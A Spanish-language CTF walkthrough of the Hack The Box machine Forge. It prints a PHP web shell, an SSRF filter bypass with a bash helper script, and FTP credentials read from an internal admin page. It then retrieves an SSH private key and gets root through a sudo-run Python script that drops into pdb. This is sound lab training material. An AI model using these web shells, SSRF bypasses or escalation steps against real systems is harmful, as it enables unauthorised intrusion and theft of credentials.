Forge -> 10.10.11.111
---------------------
Con el script de escaneo en bash hemos descubierto los puertos 22(ssh) y 80(http)

```console
└─$ whatweb http://10.10.11.111
http://10.10.11.111 [302 Found] Apache[2.4.41], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.11.111], RedirectLocation[http://forge.htb], Title[302 Found]
```
Vamos a meter en el /etc/hosts el nombre Forge.htb.

Entramos y tenemos una galeria de fotos y una ruta para subir una imagen.
Subimos la clásica shell.php  ```<?php echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>"; ?>``` y nos dan el enlace para visualizarlo:   ```http://forge.htb/uploads/lYl9YmpShrA2sOWeUw96``` donde nos dicen que la foto no se puede visualizar y tiene errores. El asunto esque se inutiliza la
shell porque muestra su codigo y no lo interpreta. Al ponerle por tanto un parametro como ```?cmd=whoami``` da un error 404.   

La otra opcion que tenemos es la de subir una foto por una url. No se puede subir nada de internet porque por motivos de seguridad las maquinas de  hackthebox no tienen salida a internt. Como podemos meter una ruta,  a la que la web le hace una peticion, vamos a intentar un SSRF (mostrar urls de
solo acceso interno, al ser la maquina la que hace la peticion, y no nadie de fuera, las deberia mostrar)

Ponemos ```http://localhost``` y nos dice que esta whitelisteado. Si ponemos ```http://127.1``` (otra manera de referenciar al localhost, no hay  problema). Poniendo el nombre de la maquina ```http://forge.htb``` no, pero si cambiamos mayusculas por minusculas si ```http://ForGe.HtB```. 
Siguiendo el enlace dice que la foto tiene errores pero si le hacemos un curl ya nos da el codigo fuente de la pagina. 

Peticion -> POST a http://forge.htb/upload -> url=http://ForGe.hTb&remote=1

Como ya tenemos como meter el localhost, podemos acceder a subdominios restringidos y demas.
```
└─$ gobuster vhost -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t 200 -u http://forge.htb
Found: test2.forge.htb (Status: 302) [Size: 281]
Found: news.forge.htb (Status: 302) [Size: 280]
└─$ gobuster vhost -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t 200 -u http://forge.htb -r
Found: admin.forge.htb (Status: 200) [Size: 27]
```
Me hice un script para que filtre el enlace y le haga una peticion curl (ya que si esperas mucho borra todo lo que hayas subido a/uploads)

```bash
#!/bin/bash

while true
do
	echo -n "$:> " && read url
	link=$(curl -s -X POST http://forge.htb/upload -d "url=$url&remote=1" | grep -oE '<strong><a href=".*?"' | awk '{print $2}' FS="=" | tr -d '"')
	curl -s $link
done
```
```console
└─$ ./forge.sh
$:>
$:> http://aDmIn.FoRgE.HtB
<!DOCTYPE html>
<html>
<head>
    <title>Admin Portal</title>
<h1 class="align-right margin-right"><a href="/announcements">Announcements</a></h1>
$:> http://aDmIn.FoRgE.HtB/announcements
        <li>An internal ftp server has been setup with credentials as user:heightofsecurity123!</li>
        <li>The /upload endpoint now supports ftp, ftps, http and https protocols for uploading from url.</li>
        <li>The /upload endpoint has been configured for easy scripting of uploads, and for uploading an image, one can simply pass a url with ?u=<url>;.</li>
$:> ftp://user:heightofsecurity123!@FoRgE.hTb
curl: no URL specified!
curl: try 'curl --help' or 'curl --manual' for more information
```
No deja acceder al ftp directamente, pero nos dice que la ruta ```/uploads?u``` permite mostrar archivos, a esta ruta seguimos accediendo con el SSRF 
ya que el **admin.** no esta expuesto hacia fuera.
```console
$:> http://aDmIn.FoRgE.HtB/upload?u=http://aDmIn.FoRgE.HtB
```
Este /upload?u es de **admin.forge** no el mismo upload que **forge** asi que aunque el otro no lo admita este si.
> upload (normal) -> no ftp
> upload (normal) -> upload(admin)?u=ftp://

```console
$:> http://aDmIn.FoRgE.HtB/upload?u=ftp://user:heightofsecurity123!@FoRgE.hTb
drwxr-xr-x    3 1000     1000         4096 Aug 04  2021 snap
-rw-r-----    1 0        1000           33 Oct 16 09:33 user.txt
$:> http://aDmIn.FoRgE.HtB/upload?u=ftp://user:heightofsecurity123!@FoRgE.hTb/user.txt
c8b54a838595536f1e761245432be86a
$:> http://aDmIn.FoRgE.HtB/upload?u=ftp://user:heightofsecurity123!@FoRgE.hTb/../../../../../
drwxr-xr-x    3 1000     1000         4096 Aug 04  2021 snap
-rw-r-----    1 0        1000           33 Oct 16 09:33 user.txt
```
Como el ftp nos muestra el /home (y no hay nada mas) pues hay que ver si hay un directorio *.ssh*
```console
$:> http://aDmIn.FoRgE.HtB/upload?u=ftp://user:heightofsecurity123!@FoRgE.hTb/.ssh/      
-rw-------    1 1000     1000          564 May 31  2021 authorized_keys
-rw-------    1 1000     1000         2590 May 20  2021 id_rsa
-rw-------    1 1000     1000          564 May 20  2021 id_rsa.pub
$:> http://aDmIn.FoRgE.HtB/upload?u=ftp://user:heightofsecurity123!@FoRgE.hTb/.ssh/id_rsa  
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
....
```
Para explicar todo este lio de una manera mas visual:
![forge htb](https://user-images.githubusercontent.com/96772264/196032318-a1670655-e326-4151-b3b7-c403aa5d30ab.png)


Modifique el script para que guardara esto en un archivo id_rsa y luego ```chmod 600 ./id_rsa```.
```console
└─$ ssh -i id_rsa user@10.10.11.111
```
Ejecuto mi script de enumeracion:
- No hay ni SUIDS ni Capabilities interesantes
- Se puede ejecutar como SUDO sin contraseña: /usr/bin/python3 /opt/remote-manage.py
```console
user@forge:~$ sudo -u root /usr/bin/python3 /opt/remote-manage.py
Listening on localhost:34142
^C
```
No se que tiene este script:
```console
user@forge:~$ cat /opt/remote-manage.py
if clientsock.recv(1024).strip().decode() != 'secretadminpassword':
```
Utiliza la libreria subprocess, ejecutando comandos como ```ps -faux``` pero en un contexto cerrado (o sea hay que eleigr una opcion no puedes meter
input directamente y liarla). 

```console
user@forge:~$ sudo -u root /usr/bin/python3 /opt/remote-manage.py
Listening on localhost:38099
└─$ ssh -i id_rsa user@10.10.11.111
user@forge:~$ nc 127.0.0.1 38099
Enter the secret passsword: secretadminpassword
Welcome admin!

What do you wanna do: 
[1] View processes
[2] View free memory
[3] View listening sockets
[4] Quit
```

El asunto esque si pasa una exception (o sea metes algo que no sea ningun comando de los de arriba) sale a pdb

```console
What do you wanna do: 
[1] View processes
[2] View free memory
[3] View listening sockets
[4] Quit
a
user@forge:~$ sudo -u root /usr/bin/python3 /opt/remote-manage.py
Listening on localhost:38099
invalid literal for int() with base 10: b'a'
> /opt/remote-manage.py(27)<module>()
-> option = int(clientsock.recv(1024).strip())
(Pdb) os.system("/bin/bash")
root@forge:/home/user# whoami
root
```

En el directorio /root están tanto la root.txt como un script que borra todo lo que haya en /uploads y que se ejecuta cada poco tiempo.
